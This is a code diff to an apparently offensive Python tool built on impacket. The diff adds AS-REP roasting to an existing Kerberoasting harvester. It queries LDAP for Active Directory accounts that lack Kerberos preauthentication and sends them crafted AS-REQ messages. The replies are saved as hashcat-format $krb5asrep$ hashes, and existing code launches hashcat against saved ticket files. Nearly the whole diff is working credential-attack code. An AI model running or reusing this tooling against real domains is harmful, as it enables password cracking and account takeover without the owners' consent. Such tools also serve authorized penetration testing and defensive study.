@@ -17,20 +17,22 @@ import sys
 import os
 import logging
 import sqlite3
-from datetime import datetime
+import datetime
+import random
 from binascii import hexlify, unhexlify
 import subprocess
 
-from pyasn1.codec.der import decoder
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
 from impacket import version
 from impacket.ldap import ldap, ldapasn1
-from impacket.krb5.asn1 import TGS_REP
+from impacket.krb5.asn1 import TGS_REP, AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
 from impacket.krb5.ccache import CCache
 from impacket.krb5 import constants
 from impacket.examples.utils import parse_credentials
-from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
-from impacket.krb5.types import Principal
-from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, sendReceive, KerberosError
+from impacket.krb5.types import KerberosTime, Principal
+from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION, UF_DONT_REQUIRE_PREAUTH
 from impacket.ntlm import compute_lmhash, compute_nthash
 
 
@@ -107,7 +109,8 @@ class Database:
         self.commit()
         return results
 
-class GetUserSPNS:
+
+class Roaster:
 
     def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
         self.__username = username
@@ -167,7 +170,188 @@ class GetUserSPNS:
         t /= 10000000
         return t
 
-    def harvester(self):
+    def getTGT_ASREP(self, userName, requestPAC=True):
+
+        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+        asReq = AS_REQ()
+
+        domain = self.__targetDomain.upper()
+
+        logger.info("     ** Getting the krb5asrep ticket of user: "+userName+" from domain: "+domain)
+
+        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+        pacRequest = KERB_PA_PAC_REQUEST()
+        pacRequest['include-pac'] = requestPAC
+        encodedPacRequest = encoder.encode(pacRequest)
+
+        asReq['pvno'] = 5
+        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+
+        asReq['padata'] = noValue
+        asReq['padata'][0] = noValue
+        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+        asReq['padata'][0]['padata-value'] = encodedPacRequest
+
+        reqBody = seq_set(asReq, 'req-body')
+
+        opts = list()
+        opts.append(constants.KDCOptions.forwardable.value)
+        opts.append(constants.KDCOptions.renewable.value)
+        opts.append(constants.KDCOptions.proxiable.value)
+        reqBody['kdc-options'] = constants.encodeFlags(opts)
+
+        seq_set(reqBody, 'sname', serverName.components_to_asn1)
+        seq_set(reqBody, 'cname', clientName.components_to_asn1)
+
+        if domain == '':
+            raise Exception('Empty Domain not allowed in Kerberos')
+
+        reqBody['realm'] = domain
+
+        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+        reqBody['till'] = KerberosTime.to_asn1(now)
+        reqBody['rtime'] = KerberosTime.to_asn1(now)
+        reqBody['nonce'] = random.getrandbits(31)
+
+        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
+
+        seq_set_iter(reqBody, 'etype', supportedCiphers)
+
+        message = encoder.encode(asReq)
+
+        try:
+            r = sendReceive(message, domain, self.__kdcHost)
+        except KerberosError as e:
+            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                # RC4 not available, OK, let's ask for newer types
+                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+                seq_set_iter(reqBody, 'etype', supportedCiphers)
+                message = encoder.encode(asReq)
+                r = sendReceive(message, domain, self.__kdcHost)
+            else:
+                raise e
+
+        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
+        # 'Do not require Kerberos preauthentication' set
+        try:
+            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
+        except:
+            # Most of the times we shouldn't be here, is this a TGT?
+            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
+        else:
+            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
+            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)
+
+        # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
+        self.writeASREP(self.__outputFileName,'$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
+                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
+                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))
+
+
+    def harvesterNPs(self):
+        if self.__usersFile:
+            self.request_users_file_TGTs()
+            return
+
+        if self.__doKerberos:
+            target = self.getMachineName()
+        else:
+            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
+                target = self.__kdcHost
+            else:
+                target = self.__targetDomain
+
+        # Connect to LDAP
+        try:
+            ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.__baseDN, self.__kdcHost)
+            ldapConnection.login(self.__username, self.__password, self.__domain)
+        except ldap.LDAPSessionError as e:
+            if str(e).find('strongerAuthRequired') >= 0:
+                # We need to try SSL
+                ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.__baseDN, self.__kdcHost)
+                ldapConnection.login(self.__username, self.__password, self.__domain)
+            else:
+                raise
+
+
+        # Building the search filter
+        searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
+                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
+                       (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)
+
+        logger.info("    ** Searching LDAP for ASREP Roastable accounts")
+        self.answersNPs = []
+
+        try:
+            sc = ldap.SimplePagedResultsControl(size=1000)
+            resp = ldapConnection.search(searchFilter=searchFilter,
+                                         attributes=['sAMAccountName',
+                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
+                                                     sizeLimit=0, searchControls = [sc], perRecordCallback=self.processRecordNP)
+        except ldap.LDAPSearchError as e:
+            logger.info(e.getErrorString())
+            if e.getErrorString().find('sizeLimitExceeded') >= 0:
+                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
+                pass
+            else:
+                raise
+
+        self.resultsNPs = []
+
+        if len(self.answersNPs)>0:
+            usernames = [answer[0] for answer in self.answersNPs]
+            self.request_multiple_TGTs(usernames)
+
+        return self.resultsNPs
+
+    def processRecordNP(self, item):
+        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
+            return
+
+        mustCommit = False
+        sAMAccountName =  ''
+        memberOf = ''
+        pwdLastSet = ''
+        userAccountControl = 0
+        lastLogon = 'N/A'
+        try:
+            for attribute in item['attributes']:
+                if str(attribute['type']) == 'sAMAccountName':
+                    sAMAccountName = str(attribute['vals'][0])
+                    mustCommit = True
+                elif str(attribute['type']) == 'userAccountControl':
+                    userAccountControl = "0x%x" % int(attribute['vals'][0])
+                elif str(attribute['type']) == 'memberOf':
+                    memberOf = str(attribute['vals'][0])
+                elif str(attribute['type']) == 'pwdLastSet':
+                    if str(attribute['vals'][0]) == '0':
+                        pwdLastSet = '<never>'
+                    else:
+                        pwdLastSet = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                elif str(attribute['type']) == 'lastLogon':
+                    if str(attribute['vals'][0]) == '0':
+                        lastLogon = '<never>'
+                    else:
+                        lastLogon = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+            if mustCommit is True:
+                self.answersNPs.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
+        except Exception as e:
+            logging.debug("Exception:", exc_info=True)
+            logging.error('Skipping item, cannot process due to error %s' % str(e))
+            pass
+
+    def request_multiple_TGTs(self, usernames):
+        for username in usernames:
+            try:
+                entry = self.getTGT_ASREP(username)
+                self.resultsNPs.append(entry)
+            except Exception as e:
+                logging.error('%s' % str(e))
+
+    def harvesterSPNs(self):
 
         if self.__usersFile:
             self.request_users_file_TGSs()
@@ -205,25 +389,25 @@ class GetUserSPNS:
 
 
         logger.info("    ** Searching LDAP for SPNs")
-        self.answers = []
+        self.answersSPNs = []
 
         try:
             sc = ldap.SimplePagedResultsControl(size=1000)
             resp = ldapConnection.search(searchFilter=searchFilter,
                                          attributes=['servicePrincipalName', 'sAMAccountName',
                                                      'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
-                                                     sizeLimit=0, searchControls = [sc], perRecordCallback=self.processRecord)
+                                                     sizeLimit=0, searchControls = [sc], perRecordCallback=self.processRecordSPN)
         except ldap.LDAPSearchError as e:
-            print(e.getErrorString())
+            logger.info(e.getErrorString())
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
                 logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                 pass
             else:
                 raise
 
-        return self.answers
+        return self.answersSPNs
 
-    def processRecord(self, item):
+    def processRecordSPN(self, item):
         if isinstance(item, ldapasn1.SearchResultEntry) is not True:
             return
 
@@ -252,12 +436,12 @@ class GetUserSPNS:
                     if str(attribute['vals'][0]) == '0':
                         pwdLastSet = '<never>'
                     else:
-                        pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                        pwdLastSet = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                 elif str(attribute['type']) == 'lastLogon':
                     if str(attribute['vals'][0]) == '0':
                         lastLogon = '<never>'
                     else:
-                        lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                        lastLogon = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                 elif str(attribute['type']) == 'servicePrincipalName':
                     for spn in attribute['vals']:
                         SPNs.append(str(spn))
@@ -267,7 +451,7 @@ class GetUserSPNS:
                     pass
                 else:
                     for spn in SPNs:
-                        self.answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
+                        self.answersSPNs.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
         except Exception as e:
             logger.info('Skipping item, cannot process due to error %s' % str(e))
             pass
@@ -343,7 +527,7 @@ class GetUserSPNS:
 
             for user, SPN in users.items():
 
-                logger.info("Getting TGS from user: "+user+" with SPN: "+SPN)
+                logger.info("     ** Getting TGS from user: "+user+" with SPN: "+SPN)
 
                 sAMAccountName = user
                 downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName
@@ -362,6 +546,10 @@ class GetUserSPNS:
                     logger.debug("Exception:", exc_info=True)
                     logger.debug('Principal: %s - %s' % (downLevelLogonName, str(e)))
 
+    def writeASREP(self, fd, asrep):
+        writer = open(fd+"."+asrep.split('$')[2]+".krb5asrep", 'a')
+        writer.write(asrep + '\n')
+        writer.close()
 
     def writeTGS(self, fd, tgs):
         writer = open(fd+"."+tgs.split('$')[2]+".krb5tgs", 'a')
@@ -467,7 +655,7 @@ if __name__ == "__main__":
         options.k = True
 
     if options.crack is not None and options.outputfile is None:
-        print("Cannot use the crack option without outputting the results to files using the -outputfile option")
+        logger.info("Cannot use the crack option without outputting the results to files using the -outputfile option")
         exit()
 
     # enforcing default arguments
@@ -491,7 +679,7 @@ if __name__ == "__main__":
     logging.getLogger().addHandler(stdoutHandler)
 
     if options.debug is True:
-        debugHandler = logging.FileHandler('debug_' + datetime.now().strftime('%Y-%m-%d_%H-%M') + '.log')
+        debugHandler = logging.FileHandler('debug_' + datetime.datetime.now().strftime('%Y-%m-%d_%H-%M') + '.log')
         debugHandler.setLevel(logging.DEBUG)
         debugHandler.setFormatter(formatter)
         logging.getLogger().addHandler(debugHandler)
@@ -511,7 +699,7 @@ if __name__ == "__main__":
         logger.info("Storing state in: "+options.dbfile)
 
         if options.outputfile is not None:
-            options.outputfile = options.outputfile + "_" + datetime.now().strftime('%Y-%m-%d_%H-%M')
+            options.outputfile = options.outputfile + "_" + datetime.datetime.now().strftime('%Y-%m-%d_%H-%M')
             logger.info("Outputting results in: "+options.outputfile)
 
         if not os.path.exists(options.dbfile):
@@ -527,22 +715,35 @@ if __name__ == "__main__":
 
         for targetDomain in domains:
             logger.info(" ** Starting enumerating domain: "+targetDomain)
-            getUserSPNS = GetUserSPNS(username, password, authDomain, targetDomain, options)
-            domainAnswers = getUserSPNS.harvester()
 
-            tgsList = []
-            for spn in domainAnswers:
-                logger.debug("Found SPN: "+spn[0])
-                newSpn = db.find_spn(targetDomain, spn[0], spn[1], spn[3])
-                if newSpn:
-                    tgsList.append(newSpn)
+            roaster = Roaster(username, password, authDomain, targetDomain, options)
 
-            if len(tgsList)>0:
-                getUserSPNS.getTGS(tgsList)
+            # KERBEROAST
+
+            #spnAnswers = roaster.harvesterSPNs()
+            # tgsList = []
+            # for spn in spnAnswers:
+            #     logger.debug("Found SPN: "+spn[0])
+            #     newSpn = db.find_spn(targetDomain, spn[0], spn[1], spn[3])
+            #     if newSpn:
+            #         tgsList.append(newSpn)
+            #
+            # if len(tgsList)>0:
+            #     roaster.getTGS(tgsList)
+            #     if options.outputfile is not None:
+            #         logger.info("    ** Results written to: "+options.outputfile+".XX.krb5tgs, where XX is the encryption type id of the ticket.")
+            # else:
+            #     logger.info("    ** No new or changed SPNs found for domain: "+targetDomain)
+
+            # ASREP ROAST
+            npResults = roaster.harvesterNPs()
+
+            if len(npResults)>0:
                 if options.outputfile is not None:
-                    logger.info("    ** Results written to: "+options.outputfile+".XX.krb5tgs, where XX is the encryption type id of the ticket.")
+                    logger.info("    ** Results written to: "+options.outputfile+".XX.krb5asrep, where XX is the encryption type id of the ticket.")
             else:
-                logger.info("    ** No new or changed SPNs found for domain: "+targetDomain)
+                logger.info("    ** No NPUsers found for domain: "+targetDomain)
+
 
             logger.info(" ** Finished enumerating domain: "+targetDomain)
 
@@ -550,13 +751,13 @@ if __name__ == "__main__":
 
         if options.crack is not None:
             if os.path.exists(options.outputfile+".23.krb5tgs"):
-                print("Starting to crack RC4 tickets using wordlist: "+options.crack)
+                logger.info("Starting to crack RC4 tickets using wordlist: "+options.crack)
                 subprocess.run(["hashcat","-m13100","-a0",options.outputfile+".23.krb5tgs",options.crack,"--force"]).stdout
             if os.path.exists(options.outputfile+".17.krb5tgs"):
-                print("Starting to crack AES128 encrypted tickets using wordlist: "+options.crack)
+                logger.info("Starting to crack AES128 encrypted tickets using wordlist: "+options.crack)
                 subprocess.run(["hashcat","-m19600","-a0",options.outputfile+".17.krb5tgs",options.crack,"--force"]).stdout
             if os.path.exists(options.outputfile+".18.krb5tgs"):
-                print("Starting to crack AES256 encrypted tickets using wordlist: "+options.crack)
+                logger.info("Starting to crack AES256 encrypted tickets using wordlist: "+options.crack)
                 subprocess.run(["hashcat","-m19700","-a0",options.outputfile+".18.krb5tgs",options.crack,"--force"]).stdout
 
     except Exception as e:
